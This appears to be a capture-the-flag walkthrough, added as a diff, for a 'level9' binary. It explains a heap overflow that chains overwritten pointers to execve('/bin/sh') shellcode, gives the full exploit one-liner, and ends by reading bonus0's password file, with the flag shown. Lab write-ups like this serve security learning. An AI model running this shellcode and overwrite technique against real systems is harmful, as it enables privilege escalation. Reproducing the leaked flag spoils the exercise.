@@ -1,0 +1,98 @@
+================================= LEVEL 9 WALKTHROUGH =========================================
+
+💣 Full command
+./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * 76 + "\x0c\xa0\04\x08"')
+
+This builds ONE big buffer in memory.
+
+🧠 1. First chunk
+"\x10\xa0\x04\x08"
+Meaning:
+
+This is a pointer (little endian):
+
+0x804a010
+What it points to:
+
+👉 start of shellcode (inside heap buffer)
+
+🧠 2. Second chunk (shellcode)
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68..."
+Meaning:
+
+This is raw CPU instructions:
+
+👉 execve("/bin/sh")
+
+So memory becomes:
+
+0x804a010 → shellcode
+
+🧠 3. Third chunk (padding)
+"A" * 76
+Meaning:
+
+Just filler bytes:
+
+AAAAAAAAAAAAAAAAAAAA....
+Why?
+
+👉 to reach exact memory offset (overwrite target field)
+
+🧠 4. Fourth chunk (critical overwrite)
+"\x0c\xa0\04\x08"
+Meaning:
+
+This is another pointer:
+
+0x804a00c
+💥 What is 0x804a00c?
+
+It is the first dereference target
+
+It contains:
+
+0x804a010
+
+So we build:
+
+0x804a00c → 0x804a010 → shellcode
+🧠 5. How everything fits in memory
+
+Final layout:
+
+[ 0x804a010 ]   → pointer to shellcode
+[ shellcode   ]
+[ AAAAAAAA... ] → padding to reach overwrite
+[ 0x804a00c ]   → overwritten field in object
+🔥 6. What the program does with it
+
+Assembly logic:
+
+b
+ ↓
+read first field → 0x804a00c
+ ↓
+dereference → 0x804a010
+ ↓
+call → shellcode
+💥 7. Execution result
+shellcode runs
+→ /bin/sh
+→ SUID privilege (bonus0)
+🧠 FINAL SIMPLE SUMMARY
+
+Your payload builds a 2-step pointer chain:
+
+0x804a00c → 0x804a010 → shellcode
+
+And uses padding so this chain lands exactly where the program reads memory.
+
+🚀 One-line mental model
+
+👉 “I place shellcode in memory, then I overwrite a field so the program follows a pointer chain that leads to it.”
+
+======================== get the pass ========================
+
+$ cat /home/user/bonus0/.pass
+f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
